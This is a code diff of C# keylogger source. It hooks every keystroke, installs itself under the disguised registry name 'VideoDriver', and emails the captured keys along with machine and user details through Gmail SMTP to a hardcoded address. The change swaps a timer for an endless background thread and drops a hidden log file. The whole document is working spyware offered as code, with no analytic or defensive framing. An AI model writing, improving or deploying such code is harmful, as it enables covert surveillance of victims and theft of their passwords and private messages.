@@ -6,16 +6,16 @@ using System.Net.Mail;
 using System.Net;
 using Microsoft.Win32;
 using System.Diagnostics;
+using System.Threading;
 
 namespace abc
 {
 	class AppRun
 	{
 		string logged;
-		string pathLog = "log.log"; // log file
 		string pathInstall = "D:\\key.exe"; // path to install
 		string regName = "VideoDriver"; // registry name
-		int logsize = 0;
+		int logsize = 1;
 		string logSize = "1";
 		string mailto = "mailto@gmail.com";
 
@@ -24,7 +24,7 @@ namespace abc
 		string SMTPAddress = "smtp.gmail.com";
 		int SMTPPort = 587;
 
-		System.Windows.Forms.Timer timer1;
+		Thread thr;
 		SmtpClient smtp;
 		MailMessage message;
 
@@ -35,22 +35,26 @@ namespace abc
 			logged = "";
 			logsize = int.Parse(logSize) * 512; // log will be sent when the file length is reached
 
-			if (File.Exists(pathLog))
-			{
-				StreamReader r = new StreamReader(File.OpenRead(pathLog));
-				logged = r.ReadLine();
-				r.Close();
-				r.Dispose();
-			}
 			// start hook and set event
 			UserActivityHook hook = new UserActivityHook(false, true);
 
 			hook.KeyPress += Hook_KeyPress;
 
-			timer1 = new System.Windows.Forms.Timer();
-			timer1.Interval = 15000;
-			timer1.Tick += Timer1_Tick;
-			timer1.Start();
+			thr = new Thread(ThreadRun);
+			thr.IsBackground = true;
+			thr.Start();
+		}
+
+		private void ThreadRun()
+		{
+			while (true)
+			{
+				if (logged.Length >= logsize)
+				{
+					Sendmail();
+					logged = "";
+				}
+			}
 		}
 
 		private void Install()
@@ -80,25 +84,6 @@ namespace abc
 			}
 		}
 
-		private void Timer1_Tick(object sender, EventArgs e)
-		{
-			if (logged.Length >= 50)
-			{
-				try {
-					StreamWriter w = new StreamWriter(File.Open(pathLog, FileMode.OpenOrCreate, FileAccess.Write));
-					w.Write(logged);
-					w.Close();
-					w.Dispose();
-					File.SetAttributes(pathLog, FileAttributes.Hidden | FileAttributes.System);
-				}
-				catch { }
-			}
-			if (logged.Length >= logsize)
-			{
-				Sendmail();
-			}
-		}
-
 		public void Sendmail()
 		{
 			string computer = Environment.MachineName + " - " + Environment.OSVersion + " - " + Environment.UserName;
@@ -112,8 +97,6 @@ namespace abc
 			smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
 			smtp.Credentials = new NetworkCredential(mailfrom, mailfrompassword);
 			smtp.Send(message);
-			logged = "";
-			File.Delete(pathLog);
 		}
 
 		private void Hook_KeyPress(object sender, KeyEventArgs e)
@@ -124,7 +107,6 @@ namespace abc
 			}
 			else
 				logged += "{Backspace}";
-			e.Handled = false;
 		}
 	}
 }
